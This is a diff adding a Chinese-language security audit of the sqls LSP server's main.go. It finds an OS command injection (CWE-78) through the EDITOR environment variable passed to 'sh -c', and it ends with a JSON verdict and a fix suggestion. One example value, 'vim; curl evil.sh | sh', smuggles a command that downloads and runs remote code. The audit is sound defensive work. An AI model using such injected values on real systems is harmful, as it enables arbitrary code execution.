@@ -1,0 +1,55 @@
+# sqls main.go 全文安全分析
+
+## 一、入口点枚举（通读全文）
+
+本文件是 LSP 服务器 `sqls` 的入口，共包含以下函数与入口通道：
+
+1. **main()（第 24-29 行）**：调用 realMain()，无直接输入。
+2. **realMain()（第 31-83 行）**：定义 CLI 应用，包含三个 flag 入口（`--log` 第 36-39 行、`--config` 第 40-43 行、`--trace` 第 44-47 行）和一个子命令 `config`（第 51-61 行），默认 Action 调用 serve(c)（第 62-64 行）。
+3. **serve(c *cli.Context)（第 85-140 行）**：读取 logfile/configFile/trace 三个参数；第 92-99 行打开日志文件；第 110-122 行加载配置文件或默认配置；第 125-133 行建立 jsonrpc2 连接，stdin/stdout 作为传输层。
+4. **stdrwc 的 Read/Write/Close（第 142-157 行）**：标准输入输出桥接。
+5. **openEditor(program string, args ...string)（第 159-175 行）**：拼接命令字符串并通过 shell 执行。
+
+## 二、逐条 source→sink 数据流验证
+
+### 数据流 1：EDITOR 环境变量 → exec.Command("sh", "-c", ...) 【存在漏洞】
+
+- **Source**：第 54 行 `editorEnv := os.Getenv("EDITOR")`。环境变量属于外部可控输入（用户 shell 配置、父进程、IDE 启动器均可设置）。
+- **传播**：第 55-57 行，若 EDITOR 为空则回退为字面量 "vim"（安全）；否则 editorEnv 原样保留。
+- **Sink 链**：第 60 行 `openEditor(editorEnv, config.YamlConfigPath)` → 第 160-161 行 `cmdargs := strings.Join(args, " "); command := program + " " + cmdargs` → 第 166/168 行：
+  - Windows：`exec.Command("cmd", "/c", command)`
+  - 其他平台：`exec.Command("sh", "-c", command)`
+
+**防御有效性验证**：全文对 editorEnv 没有任何校验——没有白名单、没有路径检查、没有转义、没有参数数组化传递。字符串拼接后交给 `sh -c` 解释，意味着 EDITOR 中任何 shell 元字符（如 `vim; curl evil.sh | sh`、反引号、`$()`）都会被 shell 执行。这是教科书式的命令注入。
+
+**可利用性评估**：需要承认，触发条件要求攻击者能控制 EDITOR 环境变量。在典型场景中（用户自己运行 `sqls config`），EDITOR 由用户自己设置，攻击者即受害者，风险有限。但在以下第二入口场景中危害升级：
+
+### 第二入口 / 替代通道分析
+
+1. **多租户/共享环境**：若 sqls 在 CI、容器编排或由其他服务代为启动（如通过 systemd unit、wrapper 脚本继承环境），低权限攻击者若能影响进程环境（例如通过可写的 profile 文件、CI 配置注入、`env` 注入类漏洞链），即可借 `sqls config` 子命令提权执行任意命令。
+2. **config.YamlConfigPath 作为第二个参数**：该路径来自 config 包常量，非用户输入，本身不可注入；但它被拼入同一 shell 字符串（第 161 行），若未来路径含空格或特殊字符也会破坏命令边界——当前版本不构成独立漏洞。
+3. **serve() 中的参数**：
+   - `--log`（第 92 行）：仅用于 os.OpenFile 写日志，O_CREATE|O_RDWR|O_APPEND，0660 权限，无执行语义，不构成漏洞（最多算日志路径可控的次要问题）。
+   - `--config`（第 111 行）：传入 config.GetConfig 读取 YAML，未在本文件中出现 eval 类 sink。
+   - stdin/stdout JSON-RPC 通道（第 128-133 行）：handler 包处理，不在本文件范围内，但本文件的 openEditor 不接收 RPC 输入，二者无交叉污染。
+4. **trace 开关（第 126-127 行）**：仅记录消息到日志，无注入面。
+
+### 数据流 2：cli 参数 → serve 内部使用
+
+logfile/configFile/trace 均为本地文件读写与日志开关，sink 为 OpenFile 与 log 输出，无命令执行、无 SQL、无网络外发，判定安全。
+
+## 三、结论
+
+唯一确认的漏洞是数据流 1：第 54 行环境变量 EDITOR（source）→ 第 161 行字符串拼接 → 第 168 行 `sh -c` 执行（sink），全程零过滤零转义，属 CWE-78 OS 命令注入（亦符合 CWE-77）。修复方式是不经 shell 拼接，改用参数数组形式并做白名单校验。
+
+```json
+{
+  "has_vulnerability": true,
+  "vulnerability_type": "CWE-78: Improper Neutralization of Special Elements used in an OS Command (OS Command Injection)",
+  "risk_level": "Medium",
+  "source": "line 54: editorEnv := os.Getenv('EDITOR') 外部可控环境变量",
+  "sink": "line 168: exec.Command('sh', '-c', command)，command 由 line 161 字符串拼接而成",
+  "explanation": "第 54 行读取 EDITOR 环境变量后，第 60 行将其作为 program 传入 openEditor；第 160-161 行将 program 与 args 用空格拼接成单一字符串 command，第 166/168 行分别通过 cmd /c 或 sh -c 交给 shell 解释执行。全文对该输入没有任何白名单、路径规范化或转义，shell 元字符如分号、反引号、美元括号均可被解释为额外命令。触发前提是攻击者能控制运行 sqls config 子命令进程的 EDITOR 环境变量，例如在 CI、共享主机、被劫持的 wrapper 脚本或多用户环境中，从而实现任意命令执行。",
+  "fix_suggestion": "line 160-168: 放弃字符串拼接与 shell 中转，改为 exec.Command(editorEnv, args...) 直接以参数数组执行；同时对 EDITOR 做白名单校验（仅允许不含路径分隔符与元字符的可执行名，或校验其解析后的绝对路径位于 PATH 中且不含 shell 特殊字符）；Windows 下避免 cmd /c，改用 CreateProcess 语义的直接执行。"
+}
+```
